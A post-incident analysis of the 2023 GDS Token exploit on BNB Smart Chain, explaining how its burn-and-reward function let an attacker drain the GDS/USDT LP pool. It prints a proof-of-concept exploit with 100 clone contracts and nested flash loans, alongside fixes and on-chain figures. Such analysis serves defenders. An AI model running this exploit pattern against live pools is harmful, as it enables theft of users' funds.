# GDS Token — Reward Function LP Token Price Manipulation (Business Logic Flaw) Analysis

| Item | Details |
|------|------|
| **Date** | 2023-01-03 |
| **Protocol** | GDS Token |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$180,000 USDT |
| **Attacker EOA** | [0xcF23...36a7](https://bscscan.com/address/0xcF2362B46669E04B16D0780cf9B6e61c82De36a7) |
| **Attack Contract (Setup)** | [0x1605...B4b](https://bscscan.com/address/0x16059B0b6842B33c088B3246e5B7AFdDd9DffB4b) |
| **Vulnerable Contract (GDS Token)** | [0xC1Bb...278](https://bscscan.com/address/0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278) |
| **Vulnerable LP Pair (GDS/USDT)** | [0x4526...44A](https://bscscan.com/address/0x4526C263571eb57110D161b41df8FD073Df3C44A) |
| **Attack Tx 1 (Setup)** | [0xf9b6...51e](https://bscscan.com/tx/0xf9b6cc083f6e0e41ce5e5dd65b294abf577ef47c7056d86315e5e53aa662251e) |
| **Attack Tx 2 (Execution)** | [0x2bb7...694](https://bscscan.com/tx/0x2bb704e0d158594f7373ec6e53dc9da6c6639f269207da8dab883fc3b5bf6694) |
| **Attack Block** | 24,449,918 (setup) / 24,451,036 (execution, +1,118 blocks) |
| **Root Cause** | `pureUsdtToToken()` reward function burns GDS while distributing LP tokens — GDS burning manipulates pool ratio, inflating LP value; claimed repeatedly via multiple clone contracts |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/GDS_exp.sol) |
| **Analysis Reference** | [PeckShield](https://twitter.com/peckshield/status/1610095490368180224) · [BlockSecTeam](https://twitter.com/BlockSecTeam/status/1610167174978760704) |

---

## 1. Vulnerability Overview

The GDS Token protocol suffered approximately $180,000 in losses on January 3, 2023, from an attack exploiting a business logic vulnerability caused by a design flaw in the `pureUsdtToToken()` reward function.

GDS Token implements a `pureUsdtToToken()` function where a user inputs a USDT amount, the equivalent value of GDS is **burned**, and **LP tokens are distributed as a reward** in return. However, this function contains two critical flaws.

**First flaw:** Burning GDS reduces the GDS balance within the GDS/USDT pair. This causes the GDS price to rise while the pool's k value (x × y = k) remains unchanged, and the value per LP token also increases. That is, the act of calling `pureUsdtToToken()` itself has the side effect of increasing the value of LP tokens.

**Second flaw:** The quantity of LP tokens distributed as rewards is calculated based on the pool state at the time of the call, **reflecting the post-burn elevated GDS price** when evaluating LP token value. The attacker exploited this chain reaction to execute the following attack scenario:

1. Supply initial liquidity, then deploy 100 clone contracts (`ClaimReward`)
2. Each clone calls `pureUsdtToToken(100e18)` → 100 rounds of GDS burning → cumulative price appreciation
3. After 1,118 blocks (staking expiry), borrow approximately 2.37 million USDT via flash loan
4. Swap large USDT → GDS, add liquidity → maximize LP token pool value
5. Each clone calls `withdraw()` → burn small amount of GDS + claim reward LP tokens → immediately re-swap to GDS
6. Remove liquidity + sell GDS → net profit of approximately $39,201 USDT; protocol LP pool loss of ~$180,000

---

## 2. Vulnerable Code Analysis

### 2.1 `pureUsdtToToken()` — Burn-Reward Price Manipulation Loophole (Core Vulnerability)

**Vulnerable code (estimated):**
```solidity
// ❌ Vulnerability: GDS burning corrupts pool k value, artificially inflating LP unit price
function pureUsdtToToken(uint256 _uAmount) external returns (uint256) {
    // Calculate GDS quantity corresponding to the input USDT amount (based on current pool price)
    uint256 gdsAmount = getTokenAmountForUsdt(_uAmount);

    // ❌ Core flaw 1: Transfer GDS directly to deadAddress to burn
    // Burn → GDS reserve in GDS/USDT pool decreases → GDS price rises
    // In AMM invariant k = x*y, when x(GDS) decreases, y(USDT) value remains the same,
    // so NAV (net asset value) per LP token rises
    _transfer(address(this), deadAddress, gdsAmount);  // ❌ Direct manipulation of pool reserve

    // ❌ Core flaw 2: Reward calculated at elevated LP price immediately after burn
    // Caller receives excessively more LP tokens relative to contributed USDT
    uint256 lpReward = calculateLPReward(_uAmount);    // ❌ Calculated at manipulated price
    pair.transfer(msg.sender, lpReward);               // ❌ Excessive LP distribution

    return gdsAmount;
}

// ❌ Vulnerability: LP reward calculation reflects elevated GDS price post-burn
function calculateLPReward(uint256 _uAmount) internal view returns (uint256) {
    // Calculate LP unit price based on current pool state (post-burn)
    // → LP unit price is elevated immediately after GDS burn
    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
    uint256 totalLP = pair.totalSupply();
    // LP token value = (reserve0 * 2) / totalLP  (USDT basis)
    uint256 lpPrice = (uint256(reserve0) * 2 * 1e18) / totalLP;  // ❌ Manipulated price
    return (_uAmount * 1e18) / lpPrice;
}
```

**Fixed code:**
```solidity
// ✅ Fix: Calculate LP reward based on pre-burn snapshot + apply burn cap
function pureUsdtToToken(uint256 _uAmount) external returns (uint256) {
    // ✅ Fix 1: Snapshot pool state before burning
    (uint112 reserve0Before, uint112 reserve1Before,) = pair.getReserves();
    uint256 totalLPBefore = pair.totalSupply();

    uint256 gdsAmount = getTokenAmountForUsdt(_uAmount);

    // ✅ Fix 2: Apply burn cap and protect minimum pool reserve
    require(reserve1Before - gdsAmount >= MIN_RESERVE, "reserve too low");
    _transfer(address(this), deadAddress, gdsAmount);

    // ✅ Fix 3: Calculate LP reward based on pre-burn price (manipulation-proof)
    uint256 lpPrice = (uint256(reserve0Before) * 2 * 1e18) / totalLPBefore;
    uint256 lpReward = (_uAmount * 1e18) / lpPrice;

    // ✅ Fix 4: Apply maximum reward cap
    require(lpReward <= maxLPRewardPerCall, "reward exceeds limit");
    pair.transfer(msg.sender, lpReward);

    return gdsAmount;
}
```

**Issue:** When `pureUsdtToToken()` burns GDS, the GDS reserve in the `GDS/USDT` AMM pair decreases, causing the real NAV of LP tokens to rise. Since this function calculates rewards at the elevated LP unit price immediately after the burn, the caller can receive **more LP value** than the USDT they paid. Accumulating this effect across 100 clone contracts drains the LP pool at scale.

---

### 2.2 `ClaimReward` Clone Contract — Multiple Claims Loophole

**Vulnerable code:**
```solidity
// ❌ Vulnerability: Anyone can deploy a new ClaimReward contract and claim without address validation
contract ClaimReward {
    address Owner;
    GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4526C263571eb57110D161b41df8FD073Df3C44A);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address deadAddress = 0x000000000000000000000000000000000000dEaD;

    // ❌ Phase 1 claim: Receive LP reward via pureUsdtToToken
    function transferToken() external {
        // Burn GDS worth 100 USDT and receive LP tokens as reward
        // ❌ Burn → GDS price rises → larger rewards in subsequent claims
        GDS.transfer(deadAddress, GDS.pureUsdtToToken(100 * 1e18));
        Pair.transfer(Owner, Pair.balanceOf(address(this)));  // ❌ Transfer LP to attacker
    }

    // ❌ Phase 2 claim: Burn small GDS amount, re-claim LP + immediately sell GDS
    function withdraw() external {
        GDS.transfer(deadAddress, 10_000);          // ❌ Trigger additional LP claim via small burn
        Pair.transfer(Owner, Pair.balanceOf(address(this)));
        GDS.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(GDS);
        path[1] = address(USDT);
        // ❌ Immediately sell obtained GDS for USDT → profit realization
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            GDS.balanceOf(address(this)), 0, path, Owner, block.timestamp
        );
    }
}
```

**Issue:** The GDS protocol does not validate the number of `pureUsdtToToken()` claims or the identity of the calling contract. The attacker was able to create 100 contracts with identical logic, each independently executing claims.

---

## 3. Attack Flow

### 3.1 Setup Phase

- Attacker EOA `0xcF23...36a7` exchanges 50 BNB → USDT (approximately $12,500)
- Buys GDS with a portion of USDT → adds GDS/USDT liquidity → obtains LP tokens
- Deploys 100 `ClaimReward` clone contracts
- Distributes small amounts of LP tokens and GDS to each clone
- Calls `transferToken()` on each clone → burns GDS worth 100 USDT × 100 times → cumulative GDS price appreciation
- **Waits 1,118 blocks** (block 24,449,918 → 24,451,036, approximately 56 minutes)

### 3.2 Execution Phase (TX2: Block 24,451,036)

```
┌─────────────────────────────────────────────────────────────────────┐
│                     Attacker EOA (0xcF23...36a7)                    │
│             Calls testExploit() → ContractTest executes             │
└───────────────────────────┬─────────────────────────────────────────┘
                            │ 1. Request Ellipsis/Wombat SwapFlashLoan
                            ▼
┌─────────────────────────────────────────────────────────────────────┐
│     SwapFlashLoan (0x28ec...d13) — Lends 2,063,875.63 USDT         │
│     Calls executeOperation() callback                               │
└───────────────────────────┬─────────────────────────────────────────┘
                            │ 2. Nested DODO FlashLoan
                            ▼
┌─────────────────────────────────────────────────────────────────────┐
│     DODO DVM (0x26d0...618) — Lends additional 315,517.01 USDT     │
│     Calls DPPFlashLoanCall() callback                               │
└───────────────────────────┬─────────────────────────────────────────┘
                            │ 3. Bulk swap 600,000 USDT → GDS
                            ▼
┌─────────────────────────────────────────────────────────────────────┐
│     PancakeSwap GDS/USDT Pair (0x4526...44A)                        │
│     600,000 USDT → 3,448,741.57 GDS exchanged                      │
│     Add remaining USDT + GDS liquidity to GDS/USDT pair → Mint LP  │
└───────────────────────────┬─────────────────────────────────────────┘
                            │ 4. Sequential withdraw() on 100 ClaimReward contracts
                            ▼
┌─────────────────────────────────────────────────────────────────────┐
│     ClaimReward[0..99].withdraw()                                   │
│     Each clone: burn 10,000 GDS → receive LP reward                 │
│     Received GDS → immediately sold for USDT on PancakeSwap         │
│     (during price-elevated period)                                  │
│     100 iterations accumulate LP drain                              │
└───────────────────────────┬─────────────────────────────────────────┘
                            │ 5. Remove liquidity + final GDS → USDT liquidation
                            ▼
┌─────────────────────────────────────────────────────────────────────┐
│     Remove all LP → receive USDT + GDS                             │
│     Sell remaining GDS → USDT (swap)                               │
└───────────────────────────┬─────────────────────────────────────────┘
                            │ 6. Repay flash loans
                            ▼
┌─────────────────────────────────────────────────────────────────────┐
│     Repay DODO: return 315,517.01 USDT                             │
│     Repay SwapFlashLoan: return 2,065,526.73 USDT (including fee)  │
│     Attacker final profit: +39,201.65 USDT (net)                   │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

- **Protocol LP pool loss:** approximately $180,000 (cumulative drain including setup phase)
- **Attacker TX2 net profit:** $39,201.65 USDT (confirmed on-chain)
- **Total attack duration:** approximately 56 minutes (1,118 blocks between two transactions)
- **GDS burned:** in TX2 alone, 103,462 GDS sent to deadAddress + numerous small burns

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// PoC Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/GDS_exp.sol

contract ContractTest is Test {
    GDSToken GDS   = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);
    IERC20 USDT    = IERC20(0x55d398326f99059fF775485246999027B3197955);
    ISwapFlashLoan swapFlashLoan = ISwapFlashLoan(0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4526C263571eb57110D161b41df8FD073Df3C44A);
    address dodo   = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
    address[] contractList;  // List of 100 ClaimReward clone addresses

    function testExploit() public {
        // [Phase 1] Acquire initial funds: 50 BNB → USDT → GDS
        address(WBNB).call{value: 50 ether}("");
        WBNBToUSDT();                                    // Exchange BNB for USDT
        USDTToGDS(10 * 1e18);                           // Buy GDS with 10 USDT
        GDSUSDTAddLiquidity(10 * 1e18, GDS.balanceOf(address(this)));  // Provide liquidity → obtain LP

        // [Phase 2] Buy additional GDS with remaining USDT, create 100 clones
        USDTToGDS(USDT.balanceOf(address(this)));
        PerContractGDSAmount = GDS.balanceOf(address(this)) / 100;
        ClaimRewardFactory();  // Each clone: distribute LP + GDS, then execute transferToken()
                               // → burn GDS worth 100 USDT × 100 → GDS price rises

        // [Phase 3] Wait 1,100 blocks (wait for staking lock expiry)
        cheats.roll(block.number + 1100);

        // [Phase 4] Borrow large funds via nested SwapFlashLoan + DODO flash loans
        SwapFlashLoan();  // executeOperation() → nested DODOFlashLoan() call
    }

    // SwapFlashLoan callback: execute DODO flash loan then repay
    function executeOperation(
        address pool, address token, uint256 amount, uint256 fee, bytes calldata params
    ) external {
        DODOFLashLoan();  // Borrow additional 315,517 USDT
        // Repay SwapFlashLoan (including fee)
        USDT.transfer(address(swapFlashLoan), SwapFlashLoanAmount * 10_000 / 9992 + 1000);
    }

    // DODO callback: execute core attack logic
    function DPPFlashLoanCall(
        address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data
    ) external {
        // [Phase 5] Bulk swap 600,000 USDT → GDS → artificially inflate GDS price
        USDTToGDS(600_000 * 1e18);

        // [Phase 6] Add liquidity → drive LP token value to maximum
        GDSUSDTAddLiquidity(USDT.balanceOf(address(this)), GDS.balanceOf(address(this)));

        // [Phase 7] Each of 100 clones withdraw() → collect LP reward + immediately sell GDS
        // Each clone: burn 10,000 GDS → LP reward → swap received GDS for USDT
        WithdrawRewardFactory();

        // [Phase 8] Remove all LP + sell remaining GDS → recover USDT
        GDSUSDTRemovLiquidity();
        GDSToUSDT();

        // [Phase 9] Repay DODO flash loan
        USDT.transfer(dodo, dodoFlashLoanAmount);
    }

    // Deploy 100 ClaimReward contracts + execute initial claims
    function ClaimRewardFactory() internal {
        for (uint256 i = 0; i < 100; i++) {
            ClaimReward claim = new ClaimReward();          // Create new clone contract
            contractList.push(address(claim));
            Pair.transfer(address(claim), Pair.balanceOf(address(this)));  // Distribute LP
            GDS.transfer(address(claim), PerContractGDSAmount);            // Distribute GDS
            claim.transferToken();  // pureUsdtToToken(100e18) → burn GDS + LP reward
        }
    }

    // Execute sequential withdraw() on 100 clones (main LP drain phase)
    function WithdrawRewardFactory() internal {
        for (uint256 i = 0; i < 100; i++) {
            Pair.transfer(contractList[i], Pair.balanceOf(address(this)));
            IClaimReward(contractList[i]).withdraw();  // LP reward + sell GDS
        }
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Burn-reward price feedback loop within reward function | CRITICAL | CWE-682 (Incorrect Calculation) |
| V-02 | LP token reward calculation reflects post-burn price | HIGH | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| V-03 | Unlimited repeated claims via clone contracts | HIGH | CWE-400 (Uncontrolled Resource Consumption) |
| V-04 | Temporary LP pool price manipulation via flash loan | HIGH | CWE-834 (Excessive Iteration) |

### V-01: Burn-Reward Price Feedback Loop Within Reward Function

- **Description:** In a structure where `pureUsdtToToken()` burns GDS while simultaneously distributing LP tokens as rewards, the act of burning itself raises the LP price, favorably shifting the reward calculation basis. A positive feedback loop of burn → price increase → more LP rewards is formed.
- **Impact:** Continuous drainage of the LP pool. The attacker receives LP tokens of greater value than their input cost, realizing arbitrage profit.
- **Attack Conditions:** Permission to call `pureUsdtToToken()` (permissionless), LP token holdings. Theoretical attack is possible even without flash loans.

### V-02: LP Token Reward Calculation Reflects Post-Burn Price

- **Description:** The reward LP quantity is calculated using the pool state (manipulated price) immediately after the burn. This vulnerability is mitigated by using a pre-burn snapshot or TWAP.
- **Impact:** Distribution of more LP rewards than actual value relative to equivalent USDT input.
- **Attack Conditions:** Burn and reward distribution occur within the same transaction.

### V-03: Unlimited Repeated Claims via Clone Contracts

- **Description:** The GDS protocol has no address-based limits or whitelist validation for `pureUsdtToToken()` calls or LP reward claims. The attacker can create new contracts indefinitely and claim independently from each.
- **Impact:** Claiming effect amplified 100× via 100 clones. Damage can scale further by deploying more contracts.
- **Attack Conditions:** Sufficient initial capital to cover gas costs.

### V-04: Temporary LP Pool Price Manipulation via Flash Loan

- **Description:** The attacker borrowed approximately 2.37 million USDT via flash loans to supply large-scale liquidity to the GDS/USDT pair, temporarily expanding the total LP supply, then claimed clone rewards.
- **Impact:** Large-scale LP provision maximizes the reward value per clone.
- **Attack Conditions:** Access to flash loan infrastructure.

---

## 6. Remediation Recommendations

### Immediate Actions

**V-01/V-02 Fix: Calculate Reward Based on Pre-Burn Snapshot**

```solidity
// ✅ Fix: Capture pool state before burn execution for reward calculation
function pureUsdtToToken(uint256 _uAmount) external returns (uint256) {
    // ✅ 1. Snapshot current pool state before burn
    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
    uint256 totalLP = pair.totalSupply();

    // ✅ 2. Calculate reward at pre-burn price (manipulation-proof)
    uint256 lpPriceBefore = (uint256(reserve0) * 2 * 1e18) / totalLP;
    uint256 lpReward = (_uAmount * 1e18) / lpPriceBefore;

    // ✅ 3. Add burn cap and minimum reserve protection
    uint256 gdsAmount = getTokenAmountForUsdt(_uAmount);
    require(uint256(reserve1) > gdsAmount + MIN_RESERVE, "insufficient reserve");
    require(gdsAmount <= MAX_BURN_PER_CALL, "burn limit exceeded");

    // Execute burn (separated from reward calculation)
    _transfer(address(this), deadAddress, gdsAmount);

    // ✅ 4. Distribute calculated reward
    pair.transfer(msg.sender, lpReward);

    return gdsAmount;
}
```

**V-03 Fix: Apply Claim Limits and Cooldown**

```solidity
// ✅ Fix: Per-address claim count and cooldown restriction
mapping(address => uint256) public lastClaimBlock;
mapping(address => uint256) public totalClaimedLP;
uint256 public constant CLAIM_COOLDOWN = 1200;   // approximately 60 minutes (in blocks)
uint256 public constant MAX_LP_PER_ADDRESS = 1e22; // per-address LP claim cap

modifier claimGuard() {
    require(
        block.number >= lastClaimBlock[msg.sender] + CLAIM_COOLDOWN,
        "claim cooldown active"
    );
    _;
    lastClaimBlock[msg.sender] = block.number;
}

function pureUsdtToToken(uint256 _uAmount) external claimGuard returns (uint256) {
    // ... fixed logic ...
    totalClaimedLP[msg.sender] += lpReward;
    require(totalClaimedLP[msg.sender] <= MAX_LP_PER_ADDRESS, "LP claim limit reached");
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Burn-reward loop | Separate burn and reward distribution into distinct functions, or insert a timelock |
| V-02 Manipulated price basis | Switch to TWAP oracle or pre-burn snapshot-based calculation |
| V-03 Unlimited repeated claims | EOA/contract differentiation + per-address cumulative cap + cooldown |
| V-04 Flash loan manipulation | Detect and block same-block add-liquidity/remove-liquidity/claim patterns (prohibit immediate LP removal after same-block addition) |
| Overall economic design | Simulate the impact of the burn mechanism on pool price via economic modeling before deployment |

---

## 7. Lessons Learned

1. **Risk of combining burn and reward in the same design:** When token burning and LP reward distribution are combined in the same function, the act of burning can form a feedback loop that favorably shifts the reward reference price. The two operations must be separated by decoupling the price snapshot timing or splitting them into separate functions.

2. **Functions that modify pool reserves must be treated as AMM manipulation vectors:** The `transfer to deadAddress` style of burning directly modifies AMM pair reserves. When such burning is coupled with reward calculation, a manipulable economic incentive is created.

3. **Defense against multi-claim attacks via clone contracts:** On-chain addresses can be created infinitely. Address-based limits alone cannot defend against clone contract attacks. Checking for EOA (`tx.origin == msg.sender`), verifying contract code hash consistency, or using a Merkle tree-based whitelist is necessary.

4. **Flash loan + staged setup attack (Multi-TX Attack) pattern:** This attack was executed across two transactions (setup, then execution 1,118 blocks later). Defenses limited to a single block are insufficient. Even long staking periods can maximize claim value when combined with large-scale flash loans.

5. **Necessity of economic model audits:** Code-level audits alone are insufficient to detect burn-price-reward chain effects. An Economic Security Audit based on game theory and economic simulation must accompany protocol deployment.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual Value | Match |
|------|--------|-------------|------|
| Initial BNB input | 50 BNB | 50 BNB (TX1 confirmed) | ✅ |
| USDT → GDS swap (TX2) | 600,000 USDT | 600,000.00 USDT | ✅ |
| SwapFlashLoan borrowed | `balanceOf(swapFlashLoan)` | 2,063,875.63 USDT | ✅ |
| DODO FlashLoan borrowed | `balanceOf(dodo)` | 315,517.01 USDT | ✅ |
| GDS burned to deadAddress (TX2 first swap) | 111,249 GDS | 111,249.73 GDS | ✅ |
| Attacker final USDT received | ~net profit | 39,201.65 USDT | ✅ |
| SwapFlashLoan repayment | principal × 10000/9992 + 1000 | 2,065,526.73 USDT | ✅ |
| DODO repayment | dodoFlashLoanAmount | 315,517.01 USDT | ✅ |

### 8.2 On-Chain Event Log Sequence (TX2 Key Events)

1. SwapFlashLoan → attacker contract: 2,063,875 USDT flash loan
2. DODO → attacker contract: 315,517 USDT flash loan
3. Attacker → GDS/USDT pair: 600,000 USDT (bulk swap)
4. GDS/USDT pair → deadAddress: 111,249 GDS burned (swap fee)
5. GDS/USDT pair → attacker: 3,448,741 GDS received
6. Attacker → GDS/USDT pair: add liquidity (USDT + GDS) → 2,184,763 LP tokens minted
7. ClaimReward × 100: repeated GDS burning + USDT selling (combined ~103,462 additional GDS burned)
8. Attacker: remove all LP + liquidate remaining GDS → USDT
9. Attacker → DODO: repay 315,517 USDT
10. Attacker → SwapFlashLoan: repay 2,065,526 USDT (including fee)
11. Attacker final received: **39,201.65 USDT**

### 8.3 Precondition Verification (Based on Block 24,449,917 Prior to Attack)

- **GDS/USDT pair reserve:** 286,770.25 USDT / 5,643,329.62 GDS
- **Initial GDS price:** 0.050816 USDT/GDS (pre-attack)
- **Attack TX2 setup block:** 24,449,918 (TX1) → TX2 at 24,451,036 (+1,118 blocks later)
- **TX1 gas consumed:** 51,597,919 gas (including 100 clone deployments + initial claims)
- **TX2 gas consumed:** 17,440,259 gas

---

*Authored: 2026-04-11 | Analysis basis: DeFiHackLabs PoC (GDS_exp.sol) + BSC on-chain data*